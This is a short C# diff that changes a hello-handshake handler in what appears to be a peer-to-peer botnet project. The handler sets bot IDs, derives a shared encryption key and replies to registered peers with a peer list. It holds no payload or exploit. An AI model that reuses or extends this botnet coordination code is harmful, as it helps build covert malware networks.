@@ -24,22 +24,25 @@ namespace Vinchuca.Network.Protocol.Handlers
             PeerInfo peerInfo;
             if (!_peerList.TryGet(botMessage.Header.EndPoint, out peerInfo))
                 return;
+
             peerInfo.BotId = botMessage.Header.BotId;
             peerInfo.EncryptionKey = DHKeyExchange.CalculateSharedKey(msg.PublicKey, BotIdentifier.PrivateKey);
             peerInfo.Handshaked = true;
             peerInfo.BotVersion = msg.BotVersion;
             peerInfo.CfgVersion = msg.CfgVersion;
-
-            var reply = new HelloAckMessage
+            if (_peerList.TryRegister(peerInfo))
             {
-                BotVersion = 1,
-                CfgVersion = 1,
-                Peers = _peerList.Recent().ToArray()
-            };
-            _messageManager.Send(reply, botMessage.Header.BotId, botMessage.Header.CorrelationId);
+                var reply = new HelloAckMessage
+                {
+                    BotVersion = 1,
+                    CfgVersion = 1,
+                    Peers = _peerList.Recent().ToArray()
+                };
+                _messageManager.Send(reply, botMessage.Header.BotId, botMessage.Header.CorrelationId);
 
-            //_versionManager.CheckBotVersion(msg.BotVersion, msg.Header.BotId, endpoint);
-            //_versionManager.CheckCfgVersion(msg.CfgVersion, msg.Header.BotId, endpoint);
+                //_versionManager.CheckBotVersion(msg.BotVersion, msg.Header.BotId, endpoint);
+                //_versionManager.CheckCfgVersion(msg.CfgVersion, msg.Header.BotId, endpoint);
+            }
         }
     }
 }
